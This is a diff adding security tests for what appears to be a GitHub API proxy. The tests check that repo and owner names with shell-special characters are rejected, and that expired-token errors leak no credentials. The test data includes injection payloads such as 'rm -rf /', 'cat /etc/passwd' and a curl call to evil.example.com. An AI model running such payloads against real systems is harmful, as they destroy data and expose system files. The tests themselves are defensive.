@@ -367,3 +367,137 @@ describe("GET /repos/:owner/:repo/actions/runs — list workflow runs", () => {
     expect(res.body.workflow_runs).toHaveLength(1);
   });
 });
+
+describe("repo-name injection — shell-special characters rejected before GitHub API is called", () => {
+  const SPECIAL_REPOS = [
+    { label: "semicolon",  repo: "my-repo;rm -rf /" },
+    { label: "backtick",   repo: "my-repo`whoami`"  },
+    { label: "pipe",       repo: "my-repo|cat /etc/passwd" },
+    { label: "ampersand",  repo: "my-repo&&curl evil.example.com" },
+    { label: "dollar",     repo: "my-repo$HOME" },
+  ];
+
+  describe("dispatch route — POST .../dispatches", () => {
+    for (const { label, repo } of SPECIAL_REPOS) {
+      it(`returns 400 and does not call GitHub when repo contains ${label}`, async () => {
+        const encodedRepo = encodeURIComponent(repo);
+        const res = await request(makeApp())
+          .post(`/repos/owner/${encodedRepo}/actions/workflows/deploy.yml/dispatches`)
+          .set("x-e2e-user-id", E2E_USER)
+          .send({ ref: "main" });
+        expect(res.status).toBe(400);
+        expect(res.body.error).toBe("invalid_params");
+        expect(octokitMock.actions.createWorkflowDispatch).not.toHaveBeenCalled();
+      });
+    }
+  });
+
+  describe("contents GET route — special characters in owner rejected", () => {
+    for (const { label } of SPECIAL_REPOS) {
+      const badOwner = `owner;${label}`;
+      it(`returns 400 and does not call GitHub when owner contains ${label}`, async () => {
+        const encodedOwner = encodeURIComponent(badOwner);
+        const res = await request(makeApp())
+          .get(`/repos/${encodedOwner}/repo/contents/README.md`)
+          .set("x-e2e-user-id", E2E_USER);
+        expect(res.status).toBe(400);
+        expect(res.body.error).toBe("invalid_params");
+        expect(octokitMock.repos.getContent).not.toHaveBeenCalled();
+      });
+    }
+  });
+
+  describe("contents PUT route — special characters in repo rejected", () => {
+    for (const { label, repo } of SPECIAL_REPOS) {
+      it(`returns 400 and does not call GitHub when repo contains ${label}`, async () => {
+        const encodedRepo = encodeURIComponent(repo);
+        const res = await request(makeApp())
+          .put(`/repos/owner/${encodedRepo}/contents/file.txt`)
+          .set("x-e2e-user-id", E2E_USER)
+          .send({ message: "add file", content: "aGVsbG8=" });
+        expect(res.status).toBe(400);
+        expect(res.body.error).toBe("invalid_params");
+        expect(octokitMock.repos.createOrUpdateFileContents).not.toHaveBeenCalled();
+      });
+    }
+  });
+
+  describe("contents DELETE route — special characters in repo rejected", () => {
+    for (const { label, repo } of SPECIAL_REPOS) {
+      it(`returns 400 and does not call GitHub when repo contains ${label}`, async () => {
+        const encodedRepo = encodeURIComponent(repo);
+        const res = await request(makeApp())
+          .delete(`/repos/owner/${encodedRepo}/contents/file.txt`)
+          .set("x-e2e-user-id", E2E_USER)
+          .send({ message: "remove file", sha: "abc123" });
+        expect(res.status).toBe(400);
+        expect(res.body.error).toBe("invalid_params");
+        expect(octokitMock.repos.deleteFile).not.toHaveBeenCalled();
+      });
+    }
+  });
+});
+
+describe("PAT expiry / GitHub 401 — proxy returns safe error with no credential leak", () => {
+  function makeOctokitUnauthorizedError(message = "Bad credentials") {
+    const err = new Error(message) as Error & { status: number };
+    err.status = 401;
+    return err;
+  }
+
+  it("GET /repos returns 401 with generic error body when PAT is expired", async () => {
+    octokitMock.repos.listForAuthenticatedUser.mockRejectedValue(
+      makeOctokitUnauthorizedError(),
+    );
+    const res = await request(makeApp())
+      .get("/repos")
+      .set("x-e2e-user-id", E2E_USER);
+    expect(res.status).toBe(401);
+    expect(res.body.error).toBe("github_error");
+    expect(typeof res.body.details).toBe("string");
+    expect(res.body.details).not.toMatch(/ghp_/i);
+    expect(res.body.details).not.toMatch(/token/i);
+    expect(res.body.details).not.toMatch(/secret/i);
+  });
+
+  it("GET /repos/.../contents returns 401 with generic error body when PAT is expired", async () => {
+    octokitMock.repos.getContent.mockRejectedValue(
+      makeOctokitUnauthorizedError(),
+    );
+    const res = await request(makeApp())
+      .get("/repos/owner/repo/contents/README.md")
+      .set("x-e2e-user-id", E2E_USER);
+    expect(res.status).toBe(401);
+    expect(res.body.error).toBe("github_error");
+    expect(res.body.details).not.toMatch(/ghp_/i);
+    expect(res.body.details).not.toMatch(/token/i);
+  });
+
+  it("POST .../dispatches returns 401 with generic error body when PAT is expired", async () => {
+    octokitMock.actions.createWorkflowDispatch.mockRejectedValue(
+      makeOctokitUnauthorizedError("Bad credentials"),
+    );
+    const res = await request(makeApp())
+      .post("/repos/owner/repo/actions/workflows/deploy.yml/dispatches")
+      .set("x-e2e-user-id", E2E_USER)
+      .send({ ref: "main" });
+    expect(res.status).toBe(401);
+    expect(res.body.error).toBe("github_error");
+    expect(res.body.details).not.toMatch(/ghp_/i);
+    expect(res.body.details).not.toMatch(/token/i);
+  });
+
+  it("PUT .../contents returns 401 with generic error body when PAT is revoked mid-session", async () => {
+    octokitMock.repos.createOrUpdateFileContents.mockRejectedValue(
+      makeOctokitUnauthorizedError("Credentials revoked"),
+    );
+    const res = await request(makeApp())
+      .put("/repos/owner/repo/contents/file.txt")
+      .set("x-e2e-user-id", E2E_USER)
+      .send({ message: "update", content: "aGVsbG8=" });
+    expect(res.status).toBe(401);
+    expect(res.body.error).toBe("github_error");
+    expect(res.body.details).not.toMatch(/ghp_/i);
+  });
+
+});
